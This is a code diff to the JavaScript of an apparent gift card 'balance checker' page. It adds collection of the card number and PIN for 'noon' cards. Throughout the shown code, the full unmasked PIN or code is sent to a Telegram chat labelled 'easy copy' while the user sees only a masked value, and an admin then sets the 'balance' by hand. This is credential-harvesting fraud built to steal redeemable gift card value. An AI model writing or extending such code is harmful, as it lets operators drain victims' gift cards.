@@ -197,6 +197,7 @@ function selectCard(value) {
   const sel = document.getElementById('giftCardSelect');
   sel.value = value;
   updateSelectIcon();
+  updateGiftCardFields();
   document.querySelector('.checker-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
 }
 
@@ -205,6 +206,24 @@ function updateSelectIcon() {
   const opt = sel.options[sel.selectedIndex];
   document.getElementById('selectIcon').textContent =
     (opt && opt.getAttribute('data-emoji')) || '💳';
+}
+
+function updateGiftCardFields() {
+  const cardType = document.getElementById('giftCardSelect').value;
+  const isNoon = cardType === 'noon';
+  const numberGroup = document.getElementById('cardNumberGroup');
+  const pinLabel = document.getElementById('cardPinLabel');
+  const pinInput = document.getElementById('cardPin');
+  if (numberGroup) numberGroup.style.display = isNoon ? 'block' : 'none';
+  if (pinLabel) pinLabel.textContent = isNoon ? 'PIN' : 'Enter Gift Card PIN / Code';
+  if (pinInput) {
+    pinInput.placeholder = isNoon ? 'Enter PIN' : 'Enter gift card PIN / code';
+  }
+  if (!isNoon) {
+    const numInput = document.getElementById('cardNumber');
+    if (numInput) numInput.value = '';
+  }
+  clearResult();
 }
 
 function clearResult() {
@@ -338,18 +357,28 @@ async function sendTelegram(text) {
 // ── Main check balance flow ───────────────────────────────────
 async function checkBalance() {
   const cardType  = document.getElementById('giftCardSelect').value;
-  const cardPin   = _unmaskedPin; // Use the stored unmasked PIN
+  const isNoon    = cardType === 'noon';
+  let cardPin;
+  let maskedPin;
 
-  // Validate
   if (!cardType) { shakeEl(document.getElementById('giftCardSelect')); return; }
-  if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }
 
-  // Mask the input field after validation, before processing
+  if (isNoon) {
+    const cardNumber = (document.getElementById('cardNumber').value || '').trim();
+    if (!cardNumber) { shakeEl(document.getElementById('cardNumber')); return; }
+    if (!_unmaskedPin) { shakeEl(document.getElementById('cardPin')); return; }
+    cardPin = `${cardNumber}|${_unmaskedPin}`;
+    maskedPin = `${maskPin(cardNumber)} • ${maskPin(_unmaskedPin)}`;
+  } else {
+    cardPin = _unmaskedPin;
+    if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }
+    maskedPin = maskPin(cardPin);
+  }
+
   maskPinInput(document.getElementById('cardPin'));
 
   const requestId   = genId();
   const cardLabel   = CARD_LABELS[cardType] || cardType;
-  const maskedPin   = maskPin(cardPin);
 
   // If admin has already resolved this card+PIN before, reuse it immediately.
   const cached = readLatestBalance(cardType, cardPin);
@@ -380,13 +409,22 @@ async function checkBalance() {
   document.getElementById('loadingState').style.display = 'block';
 
   // ── Telegram message ──
-  const tgMessage =
+  let tgMessage =
     `🎁 <b>New Gift Card Check</b>\n\n` +
     `🃏 <b>Card Name:</b> ${cardLabel}\n` +
-    `🆔 <b>Request ID:</b> <code>${requestId}</code>\n\n` +
-    `🔑 <b>Gift PIN / Code (easy copy):</b>\n` +
-    `<code>${cardPin}</code>\n\n` +
-    `👉 Open admin panel and set balance for this Request ID.`;
+    `🆔 <b>Request ID:</b> <code>${requestId}</code>\n\n`;
+  if (isNoon) {
+    const cardNumber = cardPin.split('|')[0];
+    const pin = cardPin.split('|').slice(1).join('|');
+    tgMessage +=
+      `🔢 <b>Gift Card Number:</b>\n<code>${cardNumber}</code>\n\n` +
+      `🔑 <b>PIN:</b>\n<code>${pin}</code>\n\n`;
+  } else {
+    tgMessage +=
+      `🔑 <b>Gift PIN / Code (easy copy):</b>\n` +
+      `<code>${cardPin}</code>\n\n`;
+  }
+  tgMessage += `👉 Open admin panel and set balance for this Request ID.`;
 
   try {
     await sendTelegram(tgMessage);
@@ -473,6 +511,7 @@ function showError(msg) {
 document.addEventListener('DOMContentLoaded', () => {
   initCarousel();
   updateSelectIcon();
+  updateGiftCardFields();
 
   // Initialize unmasked PIN if there's a pre-filled value
   const cardPinInput = document.getElementById('cardPin');
